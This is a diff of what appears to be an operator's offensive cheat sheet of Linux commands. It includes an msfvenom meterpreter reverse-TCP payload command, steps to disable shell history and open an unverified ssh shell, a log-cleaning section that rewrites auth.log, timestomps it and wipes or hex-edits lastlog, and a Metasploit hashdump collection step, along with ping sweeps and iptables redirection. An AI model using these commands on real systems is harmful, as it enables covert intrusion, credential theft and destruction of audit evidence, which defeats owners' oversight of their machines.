@@ -2,7 +2,7 @@ Other pastables
 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > payload_elf
 
-************* Malware Traige ************
+*************  Malware Traige ************
 X-----------------------------
 lsof -RPnp <PID>			#lists open files, Shared Objects(Libraries), network connections for a process, is it logging to a file?
 ps -eo pid,user,cmd,euid,egid,gid,uid   #lists process effective and acutal uid
@@ -25,8 +25,10 @@ fine / -type d -name ".*"
 -----------------------------X                                                                                                                                                                                     
 
 
-************ Mando ***********
+************  Mando ***********
 X-----------------------------
+ssh -v -M -S /tmp/T1.ssh -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" user@host /bin/bash -i
+
 unset HISTFILE HISTFILESIZE HISTSIZE
 su
 unset HISTFILE HISTFILESIZE HISTSIZE
@@ -34,7 +36,7 @@ unset HISTFILE HISTFILESIZE HISTSIZE
 date; date +%s
 env
 PATH=$PATH:/sbin:/usr/sbin
-/bin/bash -ic 'alias -p'; alais ll='ls -latr'; alais pp="ps -ef | grep -v '\['"; alais nn='netstat -natup'                                                      
+/bin/bash -ic 'alias -p'; alais ll='ls -latr'; alais pp="ps -ef | grep -v '\['"; alais nn='netstat -natup'   
 
 w
 find /var/log -type f -mmin -10 x> /dev/null
@@ -126,9 +128,9 @@ find /etc/clamav -regex ".*\.\(config\|yml\)"
 -----------------------------X
 
 
-*************   Cleaning Logs   ****************
+*************  Cleaning Logs   ****************
 X-----------------------------
-date -d @<epoch time>               #converts epoch time to current date/time                                                                                                                                      
+date -d @<epoch time>               #converts epoch time to current date/time   
 
 tail -n 50 /var/log/auth.log
 cp /var/log/auth.log /tmp/.a
@@ -146,10 +148,19 @@ cat /tmp.b > /var/log/auth.log
 tail /var/log/auth.log
 touch -t yymmddhhmm.ss /var/log/auth.log
 rm -f /tmp/.b
------------------------------X                                                                                                                                                                                     
+
+#Binary files
+cat /dev/null > /var/log/lastlog
+OR
+cp /var/log/lastlog /dev/shm/.a
+hexeditor /dev/shm/.a
+OR
+lastlog -u <user> -C
+
+-----------------------------X   
 
 
-************   Collect   ******************                                                                                                                                                                   
+************  Collect   ******************  
 X-----------------------------
 run post/linux/gather/hashdump
 
@@ -160,7 +171,7 @@ apt list --installed
 -----------------------------X
 
 
-************   Exit off Box   ******************
+************  Exit off Box  ******************
 X-----------------------------
 ls -latr /var/log /var/log/audit
 find /var/log -type f -mmin -60 2>/dev/null
@@ -177,7 +188,8 @@ systemctl status auditd
 
 -----------------------------X
 
-*************** Utilty Commands ***************
+
+***************  Utilty Commands  ***************
 X-----------------------------
 # Ping Sweep
 for i in `seq 1 254`; do ping -c1 -W1 192.168.1.$i | grep ttl; done; arp -a
@@ -217,7 +229,7 @@ openssl rand -base64 12
 -----------------------------X
 
 
-*************** IPTables redirection ****************
+***************  IPTables redirection  ****************
 X-----------------------------
 
 sysctl net.ipv4.ip_forwrad=1
